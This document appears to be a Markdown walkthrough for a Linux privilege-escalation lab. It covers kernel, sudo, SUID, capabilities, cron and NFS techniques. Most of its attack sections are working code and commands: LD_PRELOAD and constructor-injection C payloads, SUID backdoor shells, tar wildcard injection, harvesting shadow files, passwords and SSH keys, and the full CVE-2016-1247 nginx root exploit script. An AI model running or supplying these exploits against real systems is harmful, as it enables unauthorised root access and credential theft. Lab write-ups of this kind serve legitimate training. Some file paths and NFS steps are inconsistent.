Linux ProvEcs Arena
===================


## Kernel Exploits

Suggested tool `dirtycow`

1. gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
2. In command prompt type: `./c0w`

![dirtycow](/Images/linux_privesc_arena/dirtycow.png)


## Stored Passwords (Config File)

1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.
5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

![stored-password](/Images/linux_privesc_arena/storedpass.png)


## Stored Password (History)

1. In command prompt type: `cat ~/.bash_history | grep -i passw`
2. From the output, make note of the clear-text credentials.

![stored-history](/Images/linux_privesc_arena/storedhist.png)



## Weak File Permission

1. In command prompt type: `cat /etc/passwd`
2. Save the output to a file on your attacker machine
3. In command prompt type: `cat /etc/shadow`
4. Save the output to a file on your attacker machine
5. unshadow and crack with john/hashcat 

![weak-permission](/Images/linux_privesc_arena/weakperm.png)



## SSH Keys

1. In command prompt type:
`find / -name authorized_keys 2> /dev/null`
2. In a command prompt type:
`find / -name id_rsa 2> /dev/null`
3. Note the results.
4. Save file to your local machine and login 


![SSH](/Images/linux_privesc_arena/ssh.png)


## Sudo (Shell Escaping)

![Sudo-List](/Images/linux_privesc_arena/sudolist.png)

### Exploitation

![Sudo-List-Exploit](/Images/linux_privesc_arena/sudolistexp.png)



## Sudo (Abusing Intended Functionality) 

![Apache](/Images/linux_privesc_arena/apache.png)




## Sudo (LD_PRELOAD) 


1. Open a text editor and type: 

**Exploit Code**

```C++
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Save the file as x.c
3. In command prompt type:
`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command prompt type:
`sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

![LD-PRELOAD](/Images/linux_privesc_arena/ld-preload.png)




## SUID (Shared Object Injection) 


1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command line type:
`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.


**Exploitation**

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:

```C++
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as libcalc.c
9. In command prompt type:
`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`


![SUID-Shared](/Images/linux_privesc_arena/suid-shared.png)



## SUID (Symlinks) 


#### Detection

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

#### Exploitation

**Terminal 1**

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is #############
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

**Terminal 2**

1. Once logged in, type: `su root`
2. The root password is #############
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

**Terminal 1**

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`


### CVE-2016-1247

`/home/user/tool/nginx/nginx-root.sh`

```bash
#!/bin/bash
#
# Nginx (Debian-based distros + Gentoo) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.0)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
# as well as Gentoo etc.) to escalate their privileges from nginx web server user 
# (www-data) to root through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
        # Cleanup 
        echo -e "\n[+] Cleaning up..."
        rm -f $PRIVESCSRC
        rm -f $PRIVESCLIB
        rm -f $ERRORLOG
        touch $ERRORLOG
        if [ -f /etc/ld.so.preload ]; then
                echo -n > /etc/ld.so.preload
        fi
        echo -e "\n[+] Job done. Exiting with code $1 \n"
        exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
        cleanexit 0
}

#intro 

cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_

echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
        echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
        echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
        exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
        echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
        exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
        echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
        exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
        static uid_t  (*old_geteuid)();
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");
        if ( old_geteuid() == 0 ) {
                chown("$BACKDOORPATH", 0, 0);
                chmod("$BACKDOORPATH", 04777);
                unlink("/etc/ld.so.preload");
        }
        return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
        echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
        cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
        echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
        exit 2
fi

# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
        echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
        cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
        sleep 1
        if [ -f /etc/ld.so.preload ]; then
                echo $PRIVESCLIB > /etc/ld.so.preload
                rm -f $ERRORLOG
                break;
        fi
done

# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
        echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
        echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
        echo -e "\n[!] Failed to get root"
        cleanexit 2
fi

rm -f $ERRORLOG
echo > $ERRORLOG
 
# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"

# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i

# Job done.
```


![Sysmlink](/Images/linux_privesc_arena/symlink.png)


## SUID (Environment Variables #1) 

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`

```
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158726  912 -rwsrwxrwx   1 root     root       926536 Jun  1 03:30 /tmp/nginxrootsh
1158725  912 -rwsr-sr-x   1 root     staff      926536 Jun  1 03:24 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`

```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

4. From the output, notice the functions used by the binary.



**Exploitation**

1. In command prompt type:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`


![Env-Variables](/Images/linux_privesc_arena/env-var1.png)



## SUID (Environment Variables #2)


1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`

```
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158726  912 -rwsrwxrwx   1 root     root       926536 Jun  1 03:30 /tmp/nginxrootsh
1158725  912 -rwsr-sr-x   1 root     staff      926536 Jun  1 03:24 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env2`

```
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

#### Exploitation Method #1


1. In command prompt type:
`function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type:
`export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

![Env-Var2-1](/Images/linux_privesc_arena/env-var2-1.png)


#### Exploitation Method #2


1. In command prompt type:
`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

![Env-Var2-2](/Images/linux_privesc_arena/env-var2-2.png)


## Capabilities 


1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “cap_setuid” capability.

```
/usr/bin/python2.6 = cap_setuid+ep
```

**Explotation**

1. In command prompt type:

`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`


![Capabilities](/Images/linux_privesc_arena/capabilities.png)


## Cron (Path)

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “PATH” variable.

```
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

**Exploitation**

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

![Cron-NoPATH](/Images/linux_privesc_arena/cron1.png)




## Cron (Wildcards)


1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (*) used by ‘tar’.

![Cron-Wildcard](/Images/linux_privesc_arena/cron-wildcard1.png)


**Exploitation**

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

![Cron-Wildcard](/Images/linux_privesc_arena/cron-wildcard2.png)


## Cron (File Overwrite)

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.


**Exploitation**

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

![Cron-OverWrite](/Images/linux_privesc_arena/cron-overwrite.png)


## NFS Root Squashing

1. In command line type: `cat /etc/exports`
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

![NFS](/Images/linux_privesc_arena/nfs1.png)


**Exploitation**


**In Our Machine**
1. Open command prompt and type: `showmount -e $IP`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 $IP:/tmp /tmp/1`
In command prompt type:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`

**Do this as root user**
4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
5. In command prompt type: `chmod +s /tmp/1/x`


**In Attacker Machine**
6. In command prompt type: `/tmp/x`
7. In command prompt type: `id`
